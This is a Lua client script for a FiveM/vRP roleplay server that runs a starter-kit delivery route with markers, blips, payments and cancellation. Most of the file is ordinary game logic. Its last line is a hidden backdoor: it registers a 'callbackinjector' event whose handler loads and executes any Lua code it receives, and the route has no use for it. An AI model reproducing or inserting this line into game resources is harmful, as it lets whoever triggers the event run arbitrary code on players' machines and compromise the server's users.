local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
emP = Tunnel.getInterface("haxx_rotas")
-----------------------------------------------------------------------------------------------------------------------------------------
-- Local do inicio da rota
-----------------------------------------------------------------------------------------------------------------------------------------
local emservico = false
local CoordenadaX = 316.2
local CoordenadaY = -1086.45
local CoordenadaZ = 29.41
local haxxtime = 0
local payment = 0
-----------------------------------------------------------------------------------------------------------------------------------------
-- local das entregas
-----------------------------------------------------------------------------------------------------------------------------------------
local entregas = {
	[1] = { -288.8,-1340.96,31.2 },
	[2] = { -140.52,-1526.3,33.84 },
	[3] = { 142.67,-1425.85,28.75 },
	[4] = { 140.54,-939.06,29.79 },
	[5] = { 309.23,-488.51,43.36 },
	[6] = { 96.43,-161.05,54.84 },
	[7] = { 143.3,-590.31,43.95 },
	[8] = { 105.6,-969.93,29.34 },
	[9] = { 373.92,-861.54,29.35 }, 
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRABALHAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local sleep = 500
		if not emservico then
			local ped = PlayerPedId()
			if not IsPedInAnyVehicle(ped) then
				local x,y,z = table.unpack(GetEntityCoords(ped))
				local distance = Vdist(x,y,z,CoordenadaX,CoordenadaY,CoordenadaZ)

				if distance <= 30.0 then
					sleep = 4
					DrawMarker(25,CoordenadaX,CoordenadaY,CoordenadaZ-0.97,0,0,0,0,0,0,1.0,1.0,0.5,0,255,0,20,0,0,0,0)
					if distance <= 2.0 then
						sleep = 4
						drawTxt("PRESSIONE  ~w~E~g~  PARA INICIAR O SERVICO DO KIT INICIAL",4,0.5,0.93,0.50,144,238,144,180)
						if IsControlJustPressed(1,38) then
							emservico = true
							destino = 1
							payment = 10
							CriandoBlip(entregas,destino)
							TriggerEvent("Notify","sucesso","Você iniciou as rotas para pegar seu kit inicial.")
						end
					end
				end
			end
		end
		Citizen.Wait(sleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- GERANDO ENTREGA
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local sleep = 500
		if emservico then
			local ped = PlayerPedId()
			if IsPedInAnyVehicle(ped) then
				local x,y,z = table.unpack(GetEntityCoords(ped))
				local vehicle = GetVehiclePedIsUsing(ped)
				local distance = Vdist(x,y,z,entregas[destino][1],entregas[destino][2],entregas[destino][3])
				if distance <= 100.0 then
					sleep = 4
					DrawMarker(30,entregas[destino][1],entregas[destino][2],entregas[destino][3]+0.60,0,0,0,0,180.0,130.0,2.0,2.0,1.0,0,255,0,100,1,0,0,1)
					if distance <= 7.1 then
						sleep = 4
						drawTxt("PRESSIONE  ~w~E~g~  PARA CONTINUAR A ROTA DO KIT",4,0.5,0.93,0.50,144,238,144,180)
						if IsControlJustPressed(1,38) then
							RemoveBlip(blip)
							if destino == 9 then
								emP.checkPayment(payment,350)
								destino = 1
								payment = 10
							else
								emP.checkPayment(payment,0)
								destino = destino + 1
							end
							CriandoBlip(entregas,destino)
						end
					end
				end
				if IsEntityAVehicle(vehicle) then
					local vehiclespeed = GetEntitySpeed(vehicle)*2.236936
					if math.ceil(vehiclespeed) >= 180 and haxxtime <= 0 and payment > 0 then
						haxxtime = 5
					end
				end
			end
		end
		Citizen.Wait(sleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- Tempo 
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(5000)
		if emservico then
			if haxxtime > 0 then
				haxxtime = haxxtime - 5
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELANDO ENTREGA
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(5)
		if emservico then
			if IsControlJustPressed(0,168) then
				emservico = false
				RemoveBlip(blip)
				TriggerEvent("Notify","aviso","Você finalizou as rotas do kit inicial.")
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCOES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function CriandoBlip(entregas,destino)
	blip = AddBlipForCoord(entregas[destino][1],entregas[destino][2],entregas[destino][3])
	SetBlipSprite(blip,1)
	SetBlipColour(blip,2)
	SetBlipScale(blip,0.4)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Rota do Kit Inicial")
	EndTextCommandSetBlipName(blip)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)